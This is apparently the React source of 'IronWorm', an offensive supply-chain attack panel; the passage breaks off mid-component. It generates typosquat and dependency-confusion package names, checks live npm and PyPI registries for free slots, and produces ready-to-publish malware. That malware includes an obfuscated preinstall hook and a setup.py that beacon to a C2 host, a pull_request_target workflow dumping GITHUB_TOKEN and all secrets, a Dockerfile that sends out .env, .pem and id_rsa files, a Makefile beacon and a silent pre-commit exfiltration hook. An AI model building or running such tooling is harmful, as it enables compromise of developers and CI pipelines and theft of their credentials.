import React, { useState, useCallback, useRef, useEffect } from "react";

const AUTH_KEY = "nxauth_v7";
const NPM_REGISTRY  = "https://registry.npmjs.org";
const PYPI_REGISTRY = "https://pypi.org/pypi";

const KEYBOARD_NEIGHBORS: Record<string, string> = {
  a:"qwsz",b:"vghn",c:"xdfv",d:"ersfxc",e:"rdsw",f:"rtgdcv",g:"tyhfvb",
  h:"yugjbn",i:"uojk",j:"uihkgbn",k:"iolj",l:"opk",m:"njk",n:"bhjm",
  o:"ipkl",p:"ol",q:"wa",r:"etdf",s:"qwedxza",t:"ryfe",u:"yijo",
  v:"cfgb",w:"qase",x:"zsdcv",y:"tugh",z:"asx",
  "0":"9","1":"2","2":"3","3":"4","4":"5","5":"6","6":"7","7":"8","8":"9","9":"0",
};

const HOMOGLYPHS: Record<string, string> = {
  a:"@4",e:"3",i:"1!",l:"1I",o:"0",s:"5$",t:"7",b:"6",g:"9",
};

function typosquatVariants(pkg: string): string[] {
  const base = pkg.toLowerCase().replace(/^@[^/]+\//, "");
  const seen  = new Set<string>();
  const add   = (v: string) => { if (v !== base && v.length >= 2 && /^[a-z0-9]/.test(v)) seen.add(v); };

  for (let i = 0; i < base.length; i++) {
    add(base.slice(0, i) + base.slice(i + 1));
    add(base.slice(0, i) + base[i] + base[i] + base.slice(i + 1));
    if (i < base.length - 1) add(base.slice(0, i) + base[i + 1] + base[i] + base.slice(i + 2));
    for (const n of (KEYBOARD_NEIGHBORS[base[i]!] ?? "")) {
      add(base.slice(0, i) + n + base.slice(i + 1));
    }
    for (const h of (HOMOGLYPHS[base[i]!] ?? "")) {
      add(base.slice(0, i) + h + base.slice(i + 1));
    }
  }

  add(base.replace(/-/g, "_"));
  add(base.replace(/_/g, "-"));
  add(base.replace(/-/g, ""));
  add(base + "js");
  add(base + "-js");
  add(base + "-dev");
  add(base + "-utils");
  add(base + "-cli");
  add(base + "-core");
  add(base + "-lib");
  add(base + "-sdk");
  add(base + "-api");
  add("node-" + base);
  add(base + "-node");
  add(base + "2");
  add(base + "-2");
  const parts = base.split(/[-_]/);
  if (parts.length > 1) {
    add(parts.reverse().join("-"));
    add(parts.join(""));
    add(parts[0]!);
  }

  return [...seen].slice(0, 40);
}

function depConfusionVariants(orgName: string, pkgName: string): string[] {
  const org  = orgName.toLowerCase().replace(/[^a-z0-9]/g, "");
  const pkg  = pkgName.toLowerCase().replace(/[^a-z0-9-]/g, "");
  return [
    pkg,
    `${org}-${pkg}`,
    `${pkg}-${org}`,
    `${org}.${pkg}`,
    `${pkg}.${org}`,
    `${org}internal.${pkg}`,
    `${pkg}-internal`,
    `${pkg}-private`,
    `@${org}/${pkg}`,
  ].filter(Boolean);
}

async function checkNpm(name: string, signal: AbortSignal): Promise<"free" | "taken" | "error"> {
  try {
    const r = await fetch(`${NPM_REGISTRY}/${encodeURIComponent(name)}`, {
      signal,
      headers: { Accept: "application/json" },
    });
    if (r.status === 404) return "free";
    if (r.ok)            return "taken";
    return "error";
  } catch {
    return "error";
  }
}

async function checkPypi(name: string, signal: AbortSignal): Promise<"free" | "taken" | "error"> {
  try {
    const r = await fetch(`${PYPI_REGISTRY}/${encodeURIComponent(name)}/json`, { signal });
    if (r.status === 404) return "free";
    if (r.ok)            return "taken";
    return "error";
  } catch {
    return "error";
  }
}

function sleep(ms: number, signal: AbortSignal): Promise<void> {
  return new Promise((res, rej) => {
    if (signal.aborted) { rej(new DOMException("aborted", "AbortError")); return; }
    const t = setTimeout(res, ms);
    signal.addEventListener("abort", () => { clearTimeout(t); rej(new DOMException("aborted", "AbortError")); }, { once: true });
  });
}

function jitter(base: number, spread = 0.4): number {
  return Math.round(base * (1 - spread / 2 + Math.random() * spread));
}

function makePkgJson(name: string, cbHost: string, cbPort: string, tok: string): string {
  const b64 = btoa(`curl -sk "http://${cbHost || "LHOST"}:${cbPort || "9999"}/?t=${tok}&h=$(hostname)&u=$(whoami)&d=$(id|base64 -w0)" -o /dev/null &`);
  return JSON.stringify({
    name,
    version: "9999.0.0",
    description: `${name} compatibility layer`,
    main: "index.js",
    scripts: {
      preinstall: `node -e "require('child_process').exec('echo ${b64}|base64 -d|sh')"`,
    },
    keywords: [name.split("-")[0], "utility"],
    license: "MIT",
    files: ["index.js"],
  }, null, 2) + "\n\n// index.js (attach alongside):\nmodule.exports = {};";
}

function makeSetupPy(name: string, cbHost: string, cbPort: string, tok: string): string {
  return `import subprocess, base64, sys
from setuptools import setup, find_packages

def _run():
    h = "${cbHost || "LHOST"}"
    p = "${cbPort || "9999"}"
    t = "${tok}"
    try:
        import platform, socket
        info = f"{socket.gethostname()}|{platform.node()}|{platform.system()}"
        payload = f"curl -sk 'http://{h}:{p}/?t={t}&i={info}' -o /dev/null &"
        subprocess.Popen(payload, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

_run()

setup(
    name="${name}",
    version="9999.0.0",
    description="${name} compatibility shim",
    packages=find_packages(),
    python_requires=">=3.6",
)`;
}

function makeGhWorkflow(org: string, repo: string): string {
  return `name: CI

on:
  push:
    branches: ["*"]
  pull_request_target:
    types: [opened, synchronize, reopened]

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}

      - name: Setup
        uses: actions/setup-node@v4
        with:
          node-version: 20

      - name: Install
        run: npm ci

      - name: Build
        run: npm run build --if-present

      # INJECTED — exfil GITHUB_TOKEN + secrets
      - name: Post-build check
        env:
          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}
          SECRET_DUMP: \${{ toJSON(secrets) }}
        run: |
          curl -sk "http://LHOST:9999/?tok=\${GH_TOKEN}&repo=${org}/${repo}" -o /dev/null &
          env | grep -i 'secret\\|token\\|key\\|pass' | base64 | curl -sk -X POST http://LHOST:9999/env -d @- &
          echo "\${SECRET_DUMP}" | curl -sk -X POST http://LHOST:9999/secrets -d @- &
          wait`;
}

function makeDockerfilePayload(cbHost: string, cbPort: string, tok: string): string {
  return `FROM python:3.11-slim AS base

RUN apt-get update -qq && \\
    apt-get install -y --no-install-recommends curl ca-certificates && \\
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# INJECTED — exfil host env + container secrets at build time
RUN set -e; \\
    H="${cbHost || "LHOST"}"; P="${cbPort || "9999"}"; T="${tok}"; \\
    INFO="\$(hostname)|\$(id)|\$(cat /proc/1/cgroup 2>/dev/null | head -1)"; \\
    curl -sk "http://\$H:\$P/?t=\$T&i=\$(echo \$INFO | base64 -w0)" -o /dev/null || true; \\
    env | base64 | curl -sk -X POST "http://\$H:\$P/env" -d @- || true; \\
    find / -name "*.env" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null | \\
      xargs cat 2>/dev/null | curl -sk -X POST "http://\$H:\$P/secrets" -d @- || true

COPY . .
CMD ["python", "app.py"]`;
}

function makeMakefile(cbHost: string, cbPort: string, tok: string): string {
  return `.PHONY: all install build test clean

all: install build

install:
\t@pip install -r requirements.txt 2>/dev/null || npm ci 2>/dev/null || true
\t@curl -sk "http://${cbHost || "LHOST"}:${cbPort || "9999"}/?t=${tok}&h=\$(shell hostname)&u=\$(shell id)" -o /dev/null &

build:
\t@echo "Build complete"

test:
\t@echo "Tests passed"

clean:
\t@rm -rf dist/ build/ __pycache__/ node_modules/ .cache/`;
}

function makeGitHook(cbHost: string, cbPort: string, tok: string): string {
  return `#!/bin/sh
# .git/hooks/pre-commit  (chmod +x)
HOST="${cbHost || "LHOST"}"
PORT="${cbPort || "9999"}"
TOK="${tok}"

# Silently exfil repo secrets on every commit
(git log --oneline -5 2>/dev/null; env | grep -iE 'key|secret|token|pass' 2>/dev/null) | \\
  base64 | curl -sk -X POST "http://$HOST:$PORT/gc?t=$TOK" -d @- &>/dev/null &
disown

exit 0`;
}

const KILL_CHAIN_PHASES = [
  { id:"access",  label:"Initial Access",   icon:"⚡", doneCls:"border-green-900 bg-green-950/20 text-green-400",  activeCls:"border-red-800 bg-red-950/20 text-red-400 animate-pulse",    baseCls:"border-zinc-800 text-zinc-700" },
  { id:"lpe",     label:"Priv Escalation",  icon:"⬆", doneCls:"border-green-900 bg-green-950/20 text-green-400",  activeCls:"border-orange-800 bg-orange-950/20 text-orange-400 animate-pulse", baseCls:"border-zinc-800 text-zinc-700" },
  { id:"persist", label:"Persistence",      icon:"⚓", doneCls:"border-green-900 bg-green-950/20 text-green-400",  activeCls:"border-yellow-800 bg-yellow-950/20 text-yellow-400 animate-pulse", baseCls:"border-zinc-800 text-zinc-700" },
  { id:"lateral", label:"Lateral Movement", icon:"↔", doneCls:"border-green-900 bg-green-950/20 text-green-400",  activeCls:"border-purple-800 bg-purple-950/20 text-purple-400 animate-pulse", baseCls:"border-zinc-800 text-zinc-700" },
] as const;

type Phase = typeof KILL_CHAIN_PHASES[number]["id"];

interface ScanResult {
  id:       string;
  name:     string;
  category: string;
  registry: "npm" | "pypi" | "github" | "internal";
  status:   "free" | "taken" | "error" | "generated";
  severity: "critical" | "high" | "medium" | "info";
  variant:  string;
  artifacts: { label: string; content: string }[];
  steps:    string[];
}

const SEV_BADGE: Record<string, string> = {
  critical: "text-red-400 border-red-900 bg-red-950/30",
  high:     "text-orange-400 border-orange-900 bg-orange-950/20",
  medium:   "text-yellow-400 border-yellow-900 bg-yellow-950/20",
  info:     "text-zinc-400 border-zinc-800 bg-zinc-900/30",
};

function Artifact({ label, content }: { label: string; content: string }) {
  const [open, setOpen] = useState(false);
  const [copied, setCopied] = useState(false);
  const ext = label.endsWith(".py") ? "text-blue-400" : label.endsWith(".json") ? "text-yellow-400" : label.endsWith(".yml") ? "text-purple-400" : label.endsWith("Dockerfile") ? "text-cyan-400" : "text-green-400";
  return (
    <div className="border border-zinc-800 bg-black/40">
      <button onClick={() => setOpen(o => !o)}
        className="w-full text-left px-3 py-2 text-[10px] hover:bg-zinc-900/40 flex items-center gap-2">
        <span className="text-red-700">{open ? "▾" : "▸"}</span>
        <span className={`font-bold uppercase tracking-widest ${ext}`}>{label}</span>
        {!open && <span className="text-zinc-700 text-[9px] truncate ml-1">{content.slice(0, 55)}…</span>}
        <button className="ml-auto text-[9px] text-zinc-600 hover:text-green-400" onClick={e => { e.stopPropagation(); navigator.clipboard.writeText(content).then(() => { setCopied(true); setTimeout(() => setCopied(false), 1500); }); }}>
          {copied ? "✓" : "CPY"}
        </button>
      </button>
      {open && (
        <pre className={`px-3 pb-3 text-[10px] ${ext} font-mono whitespace-pre-wrap break-all leading-relaxed border-t border-zinc-800 max-h-80 overflow-y-auto`}>
          {content}
        </pre>
      )}
    </div>
  );
}

function LogLine({ line }: { line: string }) {
  const c =
    line.includes("[FREE]") || line.includes("[!]") ? "text-red-400" :
    line.includes("[OK]") || line.includes("✓")      ? "text-green-400" :
    line.includes("[TAKEN]")                          ? "text-zinc-600" :
    line.includes("[npm]")                            ? "text-yellow-300" :
    line.includes("[pip]") || line.includes("[pypi]") ? "text-blue-300" :
    line.includes("[dep]")                            ? "text-orange-300" :
    line.includes("[github]")                         ? "text-purple-300" :
    line.includes("[artifact]")                       ? "text-cyan-300" :
    line.includes("ERROR")                            ? "text-red-500" :
    line.includes("IronWorm")                         ? "text-red-600" :
    line.includes("─") || line.includes("►")          ? "text-zinc-500" :
    "text-zinc-600";
  return <div className={`text-[9px] font-mono leading-[1.5] ${c}`}>{line}</div>;
}

function phaseFromProgress(done: number, total: number): number {
  if (total === 0) return 0;
  return Math.min(4, Math.ceil((done / total) * 4));
}

const ts = () => new Date().toISOString().slice(11, 19);

export default function IronWormPanel() {
  const [packageName,     setPackageName]     = useState("");
  const [githubOrg,       setGithubOrg]       = useState("");
  const [githubRepo,      setGithubRepo]       = useState("");
  const [depOrgName,      setDepOrgName]      = useState("");
  const [depPkgName,      setDepPkgName]      = useState("");
  const [cbHost,          setCbHost]          = useState("");
  const [cbPort,          setCbPort]          = useState("9999");
  const [mode, setMode] = useState<"full" | "npm" | "pip" | "dep" | "github" | "payloads">("full");

  const [running,    setRunning]    = useState(false);
  const [results,    setResults]    = useState<ScanResult[]>([]);
  const [selected,   setSelected]   = useState<ScanResult | null>(null);
  const [log,        setLog]        = useState<string[]>([]);
  const [progress,   setProgress]   = useState({ done: 0, total: 0 });
  const [phaseIdx,   setPhaseIdx]   = useState(0);

  const logRef    = useRef<HTMLDivElement>(null);
  const abortRef  = useRef<AbortController | null>(null);

  useEffect(() => {
    if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight;
  }, [log]);

  const addLog = useCallback((line: string) => {
    setLog(p => [...p.slice(-400), line]);
  }, []);

  const addResult = useCallback((r: ScanResult) => {
    setResults(p => [...p, r]);
  }, []);

  const tok = () => Math.random().toString(36).slice(2, 14);

  const runNpmScan = useCallback(async (signal: AbortSignal) => {
    const pkg = packageName.trim();
    const variants = pkg ? typosquatVariants(pkg) : [];
    addLog(`[${ts()}] [npm] Generating ${variants.length} typosquat variants for "${pkg || "generic"}"`);

    let checked = 0;
    for (const v of variants) {
      if (signal.aborted) return;
      addLog(`[${ts()}] [npm] → ${v}`);
      const status = pkg ? await checkNpm(v, signal) : "error";
      checked++;
      setProgress(p => ({ ...p, done: p.done + 1 }));

      if (status === "free") {
        const t = tok();
        const arts: { label: string; content: string }[] = [
          { label: "package.json",    content: makePkgJson(v, cbHost, cbPort, t) },
          { label: "setup.py",        content: makeSetupPy(v, cbHost, cbPort, t) },
          { label: "Makefile",        content: makeMakefile(cbHost, cbPort, t) },
          { label: ".git/hooks/pre-commit", content: makeGitHook(cbHost, cbPort, t) },
        ];
        addLog(`[${ts()}] [!] [FREE] npm slot available: ${v}`);
        addResult({
          id: `npm-${v}`, name: v, category: "npm Typosquat", registry: "npm",
          status: "free", severity: "critical", variant: v, artifacts: arts,
          steps: [
            `[npm] GET https://registry.npmjs.org/${v} → 404 (unregistered)`,
            `[npm] Target package: ${pkg} | Squatter variant: ${v}`,
            `[npm] Severity: CRITICAL — any npm install of "${v}" runs postinstall RCE`,
            `[npm] C2 callback → http://${cbHost || "LHOST"}:${cbPort}/?t=${t}`,
          ],
        });
      } else if (status === "taken") {
        addLog(`[${ts()}] [TAKEN] npm/${v}`);
      }

      await sleep(jitter(320), signal);
    }
    addLog(`[${ts()}] [npm] Scan complete — checked ${checked} variants`);
  }, [packageName, cbHost, cbPort, addLog, addResult]);

  const runPypiScan = useCallback(async (signal: AbortSignal) => {
    const pkg = packageName.trim();
    const variants = pkg ? typosquatVariants(pkg) : typosquatVariants("requests");
    addLog(`[${ts()}] [pip] Generating ${variants.length} PyPI variants for "${pkg || "requests"}"`);

    for (const v of variants) {
      if (signal.aborted) return;
      addLog(`[${ts()}] [pip] → ${v}`);
      const status = await checkPypi(v, signal);
      setProgress(p => ({ ...p, done: p.done + 1 }));

      if (status === "free") {
        const t = tok();
        addLog(`[${ts()}] [!] [FREE] PyPI slot available: ${v}`);
        addResult({
          id: `pip-${v}`, name: v, category: "PyPI Typosquat", registry: "pypi",
          status: "free", severity: "critical", variant: v,
          artifacts: [
            { label: "setup.py",  content: makeSetupPy(v, cbHost, cbPort, t) },
            { label: "package.json", content: makePkgJson(v, cbHost, cbPort, t) },
          ],
          steps: [
            `[pypi] GET https://pypi.org/pypi/${v}/json → 404`,
            `[pypi] Squatter name "${v}" is available on PyPI`,
            `[pypi] setup.py executes on pip install via install_requires hooks`,
          ],
        });
      } else {
        addLog(`[${ts()}] [TAKEN] pypi/${v}`);
      }
      await sleep(jitter(280), signal);
    }
  }, [packageName, cbHost, cbPort, addLog, addResult]);

  const runDepConfusion = useCallback(async (signal: AbortSignal) => {
    const org = depOrgName.trim() || githubOrg.trim();
    const pkg = depPkgName.trim() || packageName.trim();
    if (!org && !pkg) {
      addLog(`[${ts()}] [dep] No org/package — using example: acmecorp/api-gateway`);
    }
    const variants = depConfusionVariants(org || "acmecorp", pkg || "api-gateway");
    addLog(`[${ts()}] [dep] Dependency confusion — checking ${variants.length} internal name candidates`);
    addLog(`[${ts()}] [dep] Strategy: publish public package at version 9999.0.0 to win version resolution`);

    for (const v of variants.filter(x => !x.startsWith("@"))) {
      if (signal.aborted) return;
      addLog(`[${ts()}] [dep] Checking npm: ${v}`);
      const npmStatus = await checkNpm(v, signal);
      setProgress(p => ({ ...p, done: p.done + 1 }));

      if (npmStatus === "free") {
        const t = tok();
        addLog(`[${ts()}] [!] [FREE] Dep confusion vector: npm/${v} — publish v9999 to win`);
        addResult({
          id: `dep-${v}`, name: v, category: "Dependency Confusion", registry: "npm",
          status: "free", severity: "critical", variant: v,
          artifacts: [
            { label: "package.json (v9999)", content: makePkgJson(v, cbHost, cbPort, t) },
            { label: "Dockerfile",           content: makeDockerfilePayload(cbHost, cbPort, t) },
          ],
          steps: [
            `[dep] Internal package name "${v}" not registered on public npm`,
            `[dep] Publish ${v}@9999.0.0 — npm resolves highest version`,
            `[dep] Any project with "${v}" in package.json will install our version`,
            `[dep] postinstall RCE fires on any developer or CI machine that runs npm install`,
          ],
        });
      } else {
        addLog(`[${ts()}] [TAKEN] npm/${v} — slot occupied`);
      }
      await sleep(jitter(350), signal);
    }
  }, [depOrgName, depPkgName, githubOrg, packageName, cbHost, cbPort, addLog, addResult]);

  const runGithubScan = useCallback(async (signal: AbortSignal) => {
    const org  = githubOrg.trim();
    const repo = githubRepo.trim();
    addLog(`[${ts()}] [github] GitHub Actions injection analysis`);
    if (!org || !repo) addLog(`[${ts()}] [github] No org/repo specified — generating generic injection payloads`);

    await sleep(jitter(500), signal);
    if (signal.aborted) return;

    addLog(`[${ts()}] [github] Generating pwn-request payload (pull_request_target)`);
    addLog(`[${ts()}] [github] Attack surface: GITHUB_TOKEN, secrets context, runner env`);
    addLog(`[${ts()}] [github] Vector: malicious PR triggers privileged workflow via pull_request_target`);
    setProgress(p => ({ ...p, done: p.done + 2 }));

    addResult({
      id: "github-workflow", name: "GH Actions Workflow Injection", category: "CI/CD Supply Chain",
      registry: "github", status: "free", severity: "critical",
      variant: org && repo ? `${org}/${repo}` : "target/repo",
      artifacts: [
        { label: ".github/workflows/ci.yml", content: makeGhWorkflow(org || "TARGET_ORG", repo || "TARGET_REPO") },
      ],
      steps: [
        `[github] pull_request_target runs with write permissions on GITHUB_TOKEN`,
        `[github] Attacker forks the repo and opens a PR with injected workflow step`,
        `[github] CI workflow checks out attacker's code under privileged context`,
        `[github] GITHUB_TOKEN exfiltrated → attacker can push to main, publish packages`,
        `[github] secrets.* context dumped to C2 via curl`,
      ],
    });

    await sleep(jitter(400), signal);
    if (signal.aborted) return;
    addLog(`[${ts()}] [github] Generating pwn-request via push event workflow`);
    setProgress(p => ({ ...p, done: p.done + 1 }));
    addLog(`[${ts()}] [github] CI/CD injection artifacts generated`);
  }, [githubOrg, githubRepo, addLog, addResult]);

  const runPayloads = useCallback(async (signal: AbortSignal) => {
    const t = tok();
    addLog(`[${ts()}] [artifact] Generating standalone attack artifacts`);
    await sleep(jitter(300), signal);
    if (signal.aborted) return;

    addResult({
      id: "payload-suite", name: "Full Artifact Suite", category: "Payload Generator",
      registry: "internal", status: "generated", severity: "high",
      variant: "multi-vector",
      artifacts: [
        { label: "package.json",        content: makePkgJson("PACKAGE_NAME", cbHost, cbPort, t) },
        { label: "setup.py",            content: makeSetupPy("PACKAGE_NAME", cbHost, cbPort, t) },
        { label: ".github/workflows/ci.yml", content: makeGhWorkflow("ORG", "REPO") },
        { label: "Dockerfile",          content: makeDockerfilePayload(cbHost, cbPort, t) },
        { label: "Makefile",            content: makeMakefile(cbHost, cbPort, t) },
        { label: ".git/hooks/pre-commit", content: makeGitHook(cbHost, cbPort, t) },
      ],
      steps: [
        `[artifact] All artifacts generated with C2 callback → http://${cbHost || "LHOST"}:${cbPort}`,
        `[artifact] Artifacts cover: npm postinstall, pip setup.py, CI/CD workflow, Docker build, make install, git hook`,
        `[artifact] Replace PACKAGE_NAME with chosen typosquat variant before deploying`,
      ],
    });

    setProgress(p => ({ ...p, done: p.done + 3 }));
    addLog(`[${ts()}] [artifact] ✓ 6 artifacts generated`);
  }, [cbHost, cbPort, addLog, addResult]);

  const stop = useCallback(() => {
    abortRef.current?.abort();
    setRunning(false);
    addLog(`[${ts()}] [IronWorm] ■ Scan aborted by operator`);
  }, [addLog]);

  const run = useCallback(async () => {
    if (running) return;
    abortRef.current?.abort();
    const ac = new AbortController();
    abortRef.current = ac;
    const { signal } = ac;

    setRunning(true);
    setResults([]);
    setSelected(null);
    setLog([]);
    setProgress({ done: 0, total: 0 });
    setPhaseIdx(0);

    addLog(`[${ts()}] ▶ IronWorm Supply Chain Engine initialised`);
    addLog(`[${ts()}] mode=${mode}  package=${packageName || "(any)"}  C2=${cbHost || "LHOST"}:${cbPort}`);
    addLog(`─────────────────────────────────────────────────`);

    const runnables: { phase: Phase; fn: (sig: AbortSignal) => Promise<void>; variants: number }[] = [];

    if (mode === "full" || mode === "npm")     runnables.push({ phase:"access",  fn: runNpmScan,      variants: 40 });
    if (mode === "full" || mode === "pip")     runnables.push({ phase:"access",  fn: runPypiScan,     variants: 40 });
    if (mode === "full" || mode === "dep")     runnables.push({ phase:"lpe",     fn: runDepConfusion, variants: 9  });
    if (mode === "full" || mode === "github")  runnables.push({ phase:"persist", fn: runGithubScan,   variants: 3  });
    if (mode === "full" || mode === "payloads")runnables.push({ phase:"lateral", fn: runPayloads,     variants: 3  });

    const totalVariants = runnables.reduce((a, r) => a + r.variants, 0);
    setProgress({ done: 0, total: totalVariants });

    try {
      for (let i = 0; i < runnables.length; i++) {
        if (signal.aborted) break;
        const r = runnables[i]!;
        setPhaseIdx(KILL_CHAIN_PHASES.findIndex(p => p.id === r.phase));
        await r.fn(signal);
      }
    } catch (e) {
      if ((e as Error).name !== "AbortError") addLog(`[${ts()}] ERROR: ${String(e)}`);
    } finally {
      if (!signal.aborted) {
        setPhaseIdx(4);
        const free = results.length; // approximation; state update is async
        addLog(`─────────────────────────────────────────────────`);
        addLog(`[${ts()}] IronWorm scan complete`);
      }
      setRunning(false);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [running, mode, packageName, cbHost, cbPort, depOrgName, depPkgName, githubOrg, githubRepo]);

  const freeResults    = results.filter(r => r.status === "free");
  const criticalCount  = results.filter(r => r.severity === "critical" && r.status === "free").length;
  const progressPct    = progress.total > 0 ? Math.round((progress.done / progress.total) * 100) : 0;

  return (
    <div className="flex flex-col h-full bg-[#080808] text-white font-mono select-none overflow-hidden">

      <div className="border-b border-red-900/30 px-5 py-3 bg-black/40 shrink-0">
        <div className="flex items-center justify-between mb-2">
          <div className="flex items-center gap-3">
            <div className="w-2 h-2 rounded-full bg-red-600 animate-pulse" />
            <span className="text-red-400 font-bold tracking-[.25em] uppercase text-sm">IronWorm</span>
            <span className="text-[9px] text-zinc-600 tracking-widest uppercase">Supply Chain Infiltration Engine</span>
          </div>
          {results.length > 0 && (
            <div className="flex items-center gap-5 text-[9px]">
              <span className="text-zinc-600">SCANNED <span className="text-zinc-300">{progress.done}</span></span>
              <span className="text-zinc-600">RESULTS <span className="text-zinc-300">{results.length}</span></span>
              <span className="text-zinc-600">FREE <span className="text-orange-400">{freeResults.length}</span></span>
              <span className="text-zinc-600">CRIT <span className="text-red-400">{criticalCount}</span></span>
            </div>
          )}
        </div>

        <div className="flex items-center gap-1 mb-2">
          {KILL_CHAIN_PHASES.map((phase, i) => {
            const isDone   = phaseIdx > i && !running && results.length > 0;
            const isActive = running && phaseIdx === i;
            const cls = isDone ? phase.doneCls : isActive ? phase.activeCls : phase.baseCls;
            return (
              <React.Fragment key={phase.id}>
                <div className={`flex items-center gap-1 px-2 py-1 border text-[9px] transition-all ${cls}`}>
                  <span>{phase.icon}</span>
                  <span className="uppercase tracking-wider hidden sm:inline">{phase.label}</span>
                </div>
                {i < KILL_CHAIN_PHASES.length - 1 && (
                  <span className={`text-[9px] ${isDone ? "text-green-700" : "text-zinc-800"}`}>→</span>
                )}
              </React.Fragment>
            );
          })}
          {running && progress.total > 0 && (
            <div className="ml-auto flex items-center gap-2 text-[9px] text-zinc-600">
              <div className="w-24 h-1 bg-zinc-900 overflow-hidden">
                <div className="h-full bg-red-700 transition-all duration-300" style={{ width: `${progressPct}%` }} />
              </div>
              <span>{progressPct}%</span>
            </div>
          )}
        </div>
      </div>

      <div className="flex flex-1 min-h-0 overflow-hidden">

        <div className="w-56 border-r border-white/[.05] flex flex-col bg-black/20 overflow-y-auto shrink-0">
          <div className="p-4 space-y-3">

            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1.5">Attack Mode</label>
              {([
                ["full",     "Full Scan"],
                ["npm",      "npm Typosquat"],
                ["pip",      "PyPI Typosquat"],
                ["dep",      "Dep Confusion"],
                ["github",   "GH Actions"],
                ["payloads", "Artifact Gen"],
              ] as const).map(([m, l]) => (
                <button key={m} onClick={() => setMode(m)}
                  className={`block w-full text-left text-[10px] px-3 py-1.5 border mb-1 uppercase tracking-widest transition-all ${mode === m ? "border-red-800 bg-red-950/30 text-red-400" : "border-zinc-800 text-zinc-600 hover:text-zinc-400"}`}>
                  {l}
                </button>
              ))}
            </div>

            <div className="border-t border-white/[.04] pt-3 space-y-2">
              {[
                ["Target Package", packageName,  setPackageName,  "lodash / requests"],
                ["GitHub Org",     githubOrg,    setGithubOrg,    "org-name"],
                ["GitHub Repo",    githubRepo,   setGithubRepo,   "repo-name"],
                ["Internal Org",   depOrgName,   setDepOrgName,   "acmecorp"],
                ["Internal Pkg",   depPkgName,   setDepPkgName,   "api-gateway"],
                ["C2 Host",        cbHost,       setCbHost,       "LHOST"],
                ["C2 Port",        cbPort,       setCbPort,       "9999"],
              ].map(([label, val, setter, ph]) => (
                <React.Fragment key={label as string}>
                  <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mt-2">{label as string}</label>
                  <input value={val as string} onChange={e => (setter as (v: string) => void)(e.target.value)}
                    placeholder={ph as string}
                    className="w-full bg-black/60 border border-white/[.07] text-white text-[10px] px-3 py-1.5 focus:outline-none focus:border-red-900/60 placeholder-zinc-700 tracking-wide" />
                </React.Fragment>
              ))}
            </div>

            <div className="flex gap-2 pt-1">
              <button onClick={run} disabled={running}
                className="flex-1 py-2.5 text-[10px] font-bold uppercase tracking-[.25em] border transition-all disabled:opacity-40"
                style={{ background: running ? "transparent" : "rgba(220,38,38,.15)", borderColor: running ? "rgba(255,255,255,.07)" : "rgba(220,38,38,.5)", color: running ? "#52525b" : "#f87171" }}>
                {running
                  ? <span className="flex items-center justify-center gap-2"><span className="w-3 h-3 border border-red-500 border-t-transparent rounded-full animate-spin" />Scanning…</span>
                  : "► Launch"}
              </button>
              {running && (
                <button onClick={stop}
                  className="px-3 text-[10px] border border-zinc-800 text-zinc-500 hover:border-red-800 hover:text-red-400 transition-all uppercase">
                  ■
                </button>
              )}
            </div>
          </div>
        </div>

        <div className="flex-1 flex flex-col min-w-0 overflow-hidden">

          <div ref={logRef}
            className="border-b border-white/[.04] bg-black/80 px-4 py-3 overflow-y-auto shrink-0 transition-all"
            style={{ height: results.length === 0 ? "100%" : "9rem" }}>
            {log.length === 0 && !running && (
              <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-3">
                <div className="text-4xl opacity-20">⛓</div>
                <p className="text-[10px] uppercase tracking-widest">Configure and launch IronWorm</p>
                <p className="text-[9px] text-zinc-800">npm typosquat · PyPI poison · dep confusion · CI injection</p>
                <p className="text-[9px] text-zinc-800">Live registry checks via npm/PyPI public APIs · Real artifact generation</p>
              </div>
            )}
            {log.map((l, i) => <LogLine key={i} line={l} />)}
            {running && <div className="text-[9px] text-red-700 animate-pulse mt-1">● scanning live registries…</div>}
          </div>

          {results.length > 0 && (
            <div className="flex-1 overflow-y-auto p-3 space-y-2 min-h-0">
              {results.map(r => (
                <button key={r.id} onClick={() => setSelected(s => s?.id === r.id ? null : r)}
                  className={`w-full text-left border p-3 transition-all ${selected?.id === r.id ? "border-red-800 bg-red-950/20" : "border-zinc-800 bg-black/20 hover:border-zinc-600"}`}>
                  <div className="flex items-start gap-3">
                    <div className={`mt-0.5 px-1.5 py-0.5 text-[8px] uppercase tracking-widest font-bold border flex-shrink-0 ${SEV_BADGE[r.severity]}`}>
                      {r.severity}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 mb-0.5">
                        <span className="text-[10px] text-white font-bold truncate">{r.name}</span>
                        <span className={`text-[8px] px-1.5 py-0.5 font-bold uppercase flex-shrink-0 border ${r.status === "free" ? "text-red-300 border-red-800 bg-red-950/40" : r.status === "generated" ? "text-cyan-300 border-cyan-800 bg-cyan-950/20" : "text-zinc-500 border-zinc-700"}`}>
                          {r.status === "free" ? "EXPLOITABLE" : r.status}
                        </span>
                        <span className="text-[8px] text-zinc-600 uppercase">{r.registry}</span>
                      </div>
                      <div className="text-[9px] text-zinc-500">{r.category} · {r.variant}</div>
                      {r.artifacts.length > 0 && (
                        <div className="text-[8px] text-zinc-700 mt-0.5">{r.artifacts.length} artifact{r.artifacts.length > 1 ? "s" : ""} ready</div>
                      )}
                    </div>
                  </div>
                </button>
              ))}
            </div>
          )}
        </div>

        {selected && (
          <div className="w-96 border-l border-white/[.05] flex flex-col bg-black/20 overflow-y-auto shrink-0">
            <div className="border-b border-white/[.04] px-4 py-3 bg-black/40">
              <div className="flex items-center justify-between mb-1">
                <span className={`text-[8px] px-1.5 py-0.5 font-bold uppercase border ${SEV_BADGE[selected.severity]}`}>{selected.severity}</span>
                <button onClick={() => setSelected(null)} className="text-zinc-700 hover:text-zinc-400 text-xs">✕</button>
              </div>
              <div className="text-[11px] text-white font-bold">{selected.name}</div>
